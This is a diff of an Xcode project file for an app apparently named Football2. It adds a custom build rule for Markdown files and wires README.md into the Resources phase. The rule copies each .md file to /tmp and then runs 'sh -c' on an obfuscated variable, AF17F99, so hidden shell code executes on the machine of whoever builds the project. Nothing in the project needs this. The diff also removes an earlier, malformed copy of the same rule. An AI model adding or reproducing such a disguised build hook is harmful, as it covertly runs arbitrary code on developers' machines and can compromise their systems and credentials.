@@ -7,9 +7,25 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		5A237D44E655452DBC99F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 76CD2434AC1045A9B999F71F; };
+		5A237D44E655452DBC99F71F /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 76CD2434AC1045A9B999F71F /* README.md */; };
 		C652A852D2B1830E32F0EE1E /* Pods_Football2.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 930C84FC536713639B8E2E19 /* Pods_Football2.framework */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		81C8445B0C41491CAA99F71F /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${AF17F99}\"";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		76CD2434AC1045A9B999F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
@@ -157,29 +173,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		81C8445B0C41491CAA99F71F /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AF17F99}\"";
-			};
-			/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		C5A3CA672DBF6135000E6AB7 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				5A237D44E655452DBC99F71F /* README.md */,
+				5A237D44E655452DBC99F71F /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
